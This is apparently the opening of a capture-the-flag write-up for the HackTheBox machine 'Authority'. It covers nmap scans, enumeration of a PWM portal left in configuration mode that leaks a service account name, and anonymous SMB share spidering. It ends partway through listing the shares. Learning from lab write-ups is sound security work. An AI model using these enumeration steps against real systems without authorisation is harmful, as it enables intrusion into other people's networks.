# Authority

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.214.151
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 09:17 UTC
Nmap scan report for 10.129.214.151
Host is up (0.30s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-16 13:18:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:19:31+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:19:32+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:19:31+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:19:32+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-14T12:56:26
|_Not valid after:  2025-07-16T00:34:50
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 13:18:19 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 13:18:17 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 16 Jul 2023 13:18:18 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 16 Jul 2023 13:18:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/16%Time=64B3B5D7%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2016\x20Ju
SF:l\x202023\x2013:18:17\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Su
SF:n,\x2016\x20Jul\x202023\x2013:18:18\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\
SF:x2016\x20Jul\x202023\x2013:18:19\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sun,\x2016\x20Jul\x202023\x2013:18
SF::26\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/16%OT=53%CT=1%CU=44144%PV=Y%DS=2%DC=T%G=Y%TM=64B3B62
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=U)SE
OS:Q(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%TS=U)SEQ(SP=105%GCD=1%ISR=108%TI=I
OS:%CI=RI%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%ISR=108%TI=RD%CI=I%TS=U)SEQ(SP=10
OS:5%GCD=3%ISR=108%TI=RD%CI=RI%II=I%TS=U)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3
OS:=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=F
OS:FFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-16T13:19:20
|_  start_date: N/A
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   304.50 ms 10.10.16.1
2   253.95 ms 10.129.214.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.14 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.214.151
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 09:22 UTC
Nmap scan report for 10.129.214.151
Host is up (0.14s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-16 13:43:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-16T13:44:31+00:00; +4h00m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-16T13:44:31+00:00; +4h00m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:44:31+00:00; +4h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:44:32+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 13:43:20 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 13:43:19 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 16 Jul 2023 13:43:19 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 16 Jul 2023 13:43:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-14T12:56:26
|_Not valid after:  2025-07-16T00:34:50
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
63504/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/16%Time=64B3BBB2%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2016\x20Ju
SF:l\x202023\x2013:43:19\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Su
SF:n,\x2016\x20Jul\x202023\x2013:43:19\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\
SF:x2016\x20Jul\x202023\x2013:43:20\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sun,\x2016\x20Jul\x202023\x2013:43
SF::26\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/16%OT=53%CT=1%CU=44760%PV=Y%DS=2%DC=T%G=Y%TM=64B3BBF
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U
OS:)SEQ(SP=FE%GCD=1%ISR=10C%TI=I%CI=RI%II=I%SS=S%TS=U)SEQ(SP=FF%GCD=1%ISR=1
OS:0C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FF%GCD=1%ISR=10C%TI=RD%CI=I%II=I%TS=U
OS:)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%
OS:O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%D
OS:F=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
OS:%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-16T13:44:25
|_  start_date: N/A
|_clock-skew: mean: 4h00m04s, deviation: 0s, median: 4h00m04s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   93.12 ms  10.10.16.1
2   137.87 ms 10.129.214.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1319.29 seconds
```

```c
$ sudo nmap -sV -sU 10.129.214.151
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 09:46 UTC
Nmap scan report for authority.htb (10.129.214.151)
Host is up (0.055s latency).
Not shown: 979 closed udp ports (port-unreach)
PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Simple DNS Plus
88/udp    open          kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-16 13:57:30Z)
123/udp   open          ntp          NTP v3
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
389/udp   open          ldap         Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
464/udp   open|filtered kpasswd5
500/udp   open|filtered isakmp
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
5355/udp  open|filtered llmnr
61961/udp open|filtered unknown
62154/udp open|filtered unknown
62287/udp open|filtered unknown
62575/udp open|filtered unknown
62677/udp open|filtered unknown
62699/udp open|filtered unknown
62958/udp open|filtered unknown
63420/udp open|filtered unknown
63555/udp open|filtered unknown
64080/udp open|filtered unknown
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1329.20 seconds
```

We added `authority.htb` to our `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.151  authority.htb
```

### Enumeration of Port 80/TCP

> http://10.129.214.151/

```c
$ whatweb http://10.129.214.151/
http://10.129.214.151/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.214.151], Microsoft-IIS[10.0], Title[IIS Windows Server]
```

### Enumeration of Port 8443/TCP

> https://authority.htb:8443/

We checked the certificate first and found the ip `172.16.2.118`. After getting redirected we found a `Password Reset Self-service Portal` in `Configuration Mode`.

```c
Notice - Configuration Mode

PWM is currently in configuration mode. This mode allows updating the configuration without authenticating to an LDAP directory first. End user functionality is not available in this mode.

After you have verified the LDAP directory settings, use the Configuration Manager to restrict the configuration to prevent unauthorized changes. After restricting, the configuration can still be changed but will require LDAP directory authentication first.
```

We also found the version by clicked on the `down arrow`.

```c
PWM v2.0.3 bc96802e
```

```c
$ whatweb https://authority.htb:8443/
https://authority.htb:8443/ [200 OK] Country[RESERVED][ZZ], IP[10.129.214.151], Meta-Refresh-Redirect[/pwm]
https://authority.htb:8443/pwm [302 Found] Country[RESERVED][ZZ], IP[10.129.214.151], RedirectLocation[/pwm/]
https://authority.htb:8443/pwm/ [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/?stickyRedirectTest=key], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/?stickyRedirectTest=key [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/ [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/?stickyRedirectTest=key], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/?stickyRedirectTest=key [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/ [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/?stickyRedirectTest=key], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/?stickyRedirectTest=key [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/ [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/?stickyRedirectTest=key], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
https://authority.htb:8443/pwm/?stickyRedirectTest=key [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
ERROR Too many redirects: https://authority.htb:8443/pwm/ => https://authority.htb:8443/pwm/?stickyRedirectTest=key
https://authority.htb:8443/pwm/ [302 Found] Content-Language[en], Cookies[ID,JSESSIONID,SESSION], Country[RESERVED][ZZ], HTTPServer[PWM], HttpOnly[ID,JSESSIONID,SESSION], IP[10.129.214.151], Java, RedirectLocation[/pwm/?stickyRedirectTest=key], UncommonHeaders[x-pwm-sessionid,x-pwm-noise,x-content-type-options,x-pwm-instance,x-pwm-amb,content-security-policy], X-Frame-Options[DENY], X-XSS-Protection[1]
```

#### Configuration Manager

> https://authority.htb:8443/pwm/private/config/login

On this page we could enter a random `username` and a random `password` and got a `username`.

```c
Directory unavailable. If this error occurs repeatedly please contact your help desk.

5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: ["error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)"])
```

| Username |
| --- |
| svc_ldap |

#### Configuration Editor

> https://authority.htb:8443/pwm/private/config/login

Same here.

### Enumeration of Port 445/TCP

```c
$ crackmapexec smb 10.129.214.151 -u '' -p '' --shares
SMB         10.129.214.151  445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.214.151  445    AUTHORITY        [+] authority.htb\: 
SMB         10.129.214.151  445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```c
$ crackmapexec smb 10.129.214.151 -u ' ' -p '' --shares -M spider_plus -o READ_ONLY=false
SMB         10.129.214.151  445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.214.151  445    AUTHORITY        [+] authority.htb\: 
SPIDER_P... 10.129.214.151  445    AUTHORITY        [*] Started spidering plus with option:
SPIDER_P... 10.129.214.151  445    AUTHORITY        [*]        DIR: ['print$']
SPIDER_P... 10.129.214.151  445    AUTHORITY        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.129.214.151  445    AUTHORITY        [*]       SIZE: 51200
SPIDER_P... 10.129.214.151  445    AUTHORITY        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         10.129.214.151  445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```c
$ ll
total 24
drwxrwx--- 1 root vboxsf    30 Jul 16 09:28 10.129.214.151
-rwxrwx--- 1 root vboxsf 21505 Jul 16 09:56 10.129.214.151.json
```

```c
$ ls -la
total 0
drwxrwx--- 1 root vboxsf  30 Jul 16 09:28  .
drwxrwx--- 1 root vboxsf  66 Jul 16 09:27  ..
drwxrwx--- 1 root vboxsf  20 Jul 16 09:27  Development
drwxrwx--- 1 root vboxsf 298 Jul 16 09:29 'IPC$'
```

```c
$ find .
.
./Development
./Development/Automation
